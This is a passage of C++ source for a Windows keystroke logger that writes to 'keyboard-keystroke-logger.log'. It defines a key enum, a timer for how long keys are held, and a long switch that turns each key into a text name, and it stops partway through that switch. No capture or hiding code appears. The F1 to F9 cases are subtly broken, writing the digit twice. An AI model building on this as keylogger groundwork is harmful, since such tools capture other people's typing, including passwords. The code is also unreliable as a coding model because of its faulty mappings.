/* Import */
#include <codecvt> // Code Converter
#include <cuchar> // C Universal Characters
#include <fstream> // File Stream
#include <iostream> // Input-Output Stream

#include <time.h> // Time
#include <windows.h> // WIndows

/* Polyfill > ... */
#ifndef VK_HANGUL
#define VK_HANGUL VK_HANGUEL
#endif

/* Class */
    // Key
    inline namespace Keys { // WARN (Lapys) -> `Escape` and `Sleep` are pre-defined functions.
        enum Key {
            AdderSymbol,
            Alternate,
            Application,
            Attention,
            Backspace,
            BrowserBackFeed,
            BrowserFavorite,
            BrowserForwardFeed,
            BrowserRefresh,
            BrowserSearch,
            BrowserStart,
            BrowserStop,
            CapitalLock,
            CarriageReturn,
            CharacterA, CharacterB, CharacterC, CharacterD, CharacterE, CharacterF, CharacterG, CharacterH, CharacterI, CharacterJ, CharacterK, CharacterL, CharacterM, CharacterN, CharacterO, CharacterP, CharacterQ, CharacterR, CharacterS, CharacterT, CharacterU, CharacterV, CharacterW, CharacterX, CharacterY, CharacterZ,
            Clear,
            Control,
            ControlBreak,
            CursorSelect,
            Decimal,
            Delete,
            Digit0, Digit1, Digit2, Digit3, Digit4, Digit5, Digit6, Digit7, Digit8, Digit9,
            DividerSymbol,
            DownArrow,
            End,
            EraseEndOfFile,
            Escape,
            Execute,
            ExecuteSelect,
            F1, F2, F3, F4, F5, F6, F7, F8, F9, F10, F11, F12, F13, F14, F15, F16, F17, F18, F19, F20, F21, F22, F23, F24,
            Help,
            Home,
            HorizontalTab,
            IMEAccept, IMEConvert, IMEFinal, IMEHanja, IMEHangul, IMEJunja, IMEKana, IMEKanji, IMEModeChangeRequest, IMENonConvert, IMEProcess,
            Insert,
            LaunchApplication1, LaunchApplication2,
            LeftAlternate,
            LeftArrow,
            LeftControl,
            LeftShift,
            LeftWindowsMeta,
            MediaNextTrack, MediaPlayPause, MediaPreviousTrack, MediaStop,
            MouseLeftButton, MouseMiddleButton, MouseRightButton, MouseX1Button, MouseX2Button,
            MultiplierSymbol,
            NumberLock,
            NumberPad0, NumberPad1, NumberPad2, NumberPad3, NumberPad4, NumberPad5, NumberPad6, NumberPad7, NumberPad8, NumberPad9,
            OEMAdderSymbol,
            OEMClear,
            OEMCommaSymbol,
            OEMMiscellaneous, OEMMiscellaneous1, OEMMiscellaneous2, OEMMiscellaneous3, OEMMiscellaneous4, OEMMiscellaneous5, OEMMiscellaneous6, OEMMiscellaneous7, OEMMiscellaneous8,
            OEMPeriodSymbol,
            OEMSpecific,
            OEMSubtracterSymbol,
            PageDown, PageUp,
            Pause,
            PA1,
            Play,
            Print,
            PrintScreen,
            Reserved,
            RightAlternate,
            RightArrow,
            RightControl,
            RightShift,
            RightWindowsMeta,
            ScrollLock,
            Select,
            SelectMedia,
            Separator,
            Shift,
            Sleep,
            Spacebar,
            StartMail,
            SubtracterSymbol,
            Unassigned,
            Undefined,
            UpArrow,
            VolumeDown,
            VolumeMute,
            VolumeUp,
            Zoom
        };
    }

    // Key Timeline --- NOTE (Lapys) -> Record how long a key is pressed.
    struct KeyTimeline {
        // [...]
        private:
            // Initialization > ... Time
            clock_t currentTime;
            clock_t startTime;

        // [...]
        protected:
            // Phase > Initiate
            inline void initiate() { this -> currentTime = this -> startTime = ::clock(); }

        // [...]
        public:
            // Constant > Key --- NOTE (Lapys) -> Not actually necessary in the context its used within this source code.
            Key key;

            // [Constructor]
            inline KeyTimeline() : key{Key()} {}
            inline KeyTimeline(const Key key) : key{key} { this -> initiate(); }

            // [Operator] > [=]
            inline KeyTimeline& operator =(const Key key) { this -> key = key; this -> initiate(); return *this; }

            // Function > (Get Time ..., Tick)
            inline clock_t getTimeInMilliseconds() const { return this -> currentTime - (this -> startTime); }
            inline float getTimeInSeconds() const { return ((float) this -> getTimeInMilliseconds()) / CLOCKS_PER_SEC; }

            inline void tick() { this -> currentTime = ::clock(); }
    };

/* Global > ... (Buffer, Stream) ... */
wchar_t keyBuffer[173 * (2 + 20 + 31 + 11 + 2) /* -> 8838 */] {0}; unsigned short keyBufferLength = 0u;

const std::ios_base::openmode fileMode = std::ios::binary | std::ios::out;
const char *fileName = "keyboard-keystroke-logger.log";
std::wfstream fileStream;

Key activeKeyStream[173]; unsigned char activeKeyStreamLength = 0u;
Key releasedKeyStream[173]; unsigned char releasedKeyStreamLength = 0u;
KeyTimeline trackedActiveKeyStream[173]; unsigned char trackedActiveKeyStreamLength = 0u; // NOTE (Lapys) -> Keep track of Active keys.

/* Function */
    // Update Key Buffer
    inline void updateKeyBuffer(const Key key) {
        // Logic > Update > Buffer Character
        switch (key) {
            case AdderSymbol: *(keyBuffer + keyBufferLength) = L'+'; keyBufferLength += 1u; break;
            case Alternate: *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case Application: *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case Attention: *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case Backspace: *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'k'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case BrowserBackFeed: *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'k'; keyBufferLength += 1u; break;
            case BrowserFavorite: *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'v'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case BrowserForwardFeed: *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; break;
            case BrowserRefresh: *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; break;
            case BrowserSearch: *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'h'; keyBufferLength += 1u; break;
            case BrowserStart: *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case BrowserStop: *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; break;
            case CapitalLock: *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'k'; keyBufferLength += 1u; break;
            case CarriageReturn: *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'g'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; break;
            case CharacterA: *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; break;
            case CharacterB: *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; break;
            case CharacterC: *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; break;
            case CharacterD: *(keyBuffer + keyBufferLength) = L'D'; keyBufferLength += 1u; break;
            case CharacterE: *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; break;
            case CharacterF: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; break;
            case CharacterG: *(keyBuffer + keyBufferLength) = L'G'; keyBufferLength += 1u; break;
            case CharacterH: *(keyBuffer + keyBufferLength) = L'H'; keyBufferLength += 1u; break;
            case CharacterI: *(keyBuffer + keyBufferLength) = L'I'; keyBufferLength += 1u; break;
            case CharacterJ: *(keyBuffer + keyBufferLength) = L'J'; keyBufferLength += 1u; break;
            case CharacterK: *(keyBuffer + keyBufferLength) = L'K'; keyBufferLength += 1u; break;
            case CharacterL: *(keyBuffer + keyBufferLength) = L'L'; keyBufferLength += 1u; break;
            case CharacterM: *(keyBuffer + keyBufferLength) = L'M'; keyBufferLength += 1u; break;
            case CharacterN: *(keyBuffer + keyBufferLength) = L'N'; keyBufferLength += 1u; break;
            case CharacterO: *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; break;
            case CharacterP: *(keyBuffer + keyBufferLength) = L'P'; keyBufferLength += 1u; break;
            case CharacterQ: *(keyBuffer + keyBufferLength) = L'Q'; keyBufferLength += 1u; break;
            case CharacterR: *(keyBuffer + keyBufferLength) = L'R'; keyBufferLength += 1u; break;
            case CharacterS: *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; break;
            case CharacterT: *(keyBuffer + keyBufferLength) = L'T'; keyBufferLength += 1u; break;
            case CharacterU: *(keyBuffer + keyBufferLength) = L'U'; keyBufferLength += 1u; break;
            case CharacterV: *(keyBuffer + keyBufferLength) = L'V'; keyBufferLength += 1u; break;
            case CharacterW: *(keyBuffer + keyBufferLength) = L'W'; keyBufferLength += 1u; break;
            case CharacterX: *(keyBuffer + keyBufferLength) = L'X'; keyBufferLength += 1u; break;
            case CharacterY: *(keyBuffer + keyBufferLength) = L'Y'; keyBufferLength += 1u; break;
            case CharacterZ: *(keyBuffer + keyBufferLength) = L'Z'; keyBufferLength += 1u; break;
            case Clear: *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; break;
            case Control: *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; break;
            case ControlBreak: *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'B'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'k'; keyBufferLength += 1u; break;
            case CursorSelect: *(keyBuffer + keyBufferLength) = L'C'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case Decimal: *(keyBuffer + keyBufferLength) = L'.'; keyBufferLength += 1u; break;
            case Delete: *(keyBuffer + keyBufferLength) = L'D'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case Digit0: *(keyBuffer + keyBufferLength) = L'0'; keyBufferLength += 1u; break;
            case Digit1: *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; break;
            case Digit2: *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; break;
            case Digit3: *(keyBuffer + keyBufferLength) = L'3'; keyBufferLength += 1u; break;
            case Digit4: *(keyBuffer + keyBufferLength) = L'4'; keyBufferLength += 1u; break;
            case Digit5: *(keyBuffer + keyBufferLength) = L'5'; keyBufferLength += 1u; break;
            case Digit6: *(keyBuffer + keyBufferLength) = L'6'; keyBufferLength += 1u; break;
            case Digit7: *(keyBuffer + keyBufferLength) = L'7'; keyBufferLength += 1u; break;
            case Digit8: *(keyBuffer + keyBufferLength) = L'8'; keyBufferLength += 1u; break;
            case Digit9: *(keyBuffer + keyBufferLength) = L'9'; keyBufferLength += 1u; break;
            case DividerSymbol: *(keyBuffer + keyBufferLength) = L'\u00F7'; keyBufferLength += 1u; break;
            case DownArrow: *(keyBuffer + keyBufferLength) = L'D'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'A'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'o'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'w'; keyBufferLength += 1u; break;
            case End: *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; break;
            case EraseEndOfFile: *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'r'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'n'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'd'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'-'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'O'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'f'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'-'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'i'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case Key::Escape: *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L's'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'a'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'p'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case Execute: *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'x'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; break;
            case ExecuteSelect: *(keyBuffer + keyBufferLength) = L'E'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'x'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'u'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'S'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'l'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'e'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'c'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L't'; keyBufferLength += 1u; break;
            case F1: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; break;
            case F2: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; break;
            case F3: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'3'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'3'; keyBufferLength += 1u; break;
            case F4: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'4'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'4'; keyBufferLength += 1u; break;
            case F5: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'5'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'5'; keyBufferLength += 1u; break;
            case F6: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'6'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'6'; keyBufferLength += 1u; break;
            case F7: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'7'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'7'; keyBufferLength += 1u; break;
            case F8: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'8'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'8'; keyBufferLength += 1u; break;
            case F9: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'9'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'9'; keyBufferLength += 1u; break;
            case F10: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'0'; keyBufferLength += 1u; break;
            case F11: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; break;
            case F12: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'2'; keyBufferLength += 1u; break;
            case F13: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'3'; keyBufferLength += 1u; break;
            case F14: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'4'; keyBufferLength += 1u; break;
            case F15: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'5'; keyBufferLength += 1u; break;
            case F16: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'6'; keyBufferLength += 1u; break;
            case F17: *(keyBuffer + keyBufferLength) = L'F'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'1'; keyBufferLength += 1u; *(keyBuffer + keyBufferLength) = L'7'; keyBufferLength += 1u; break;
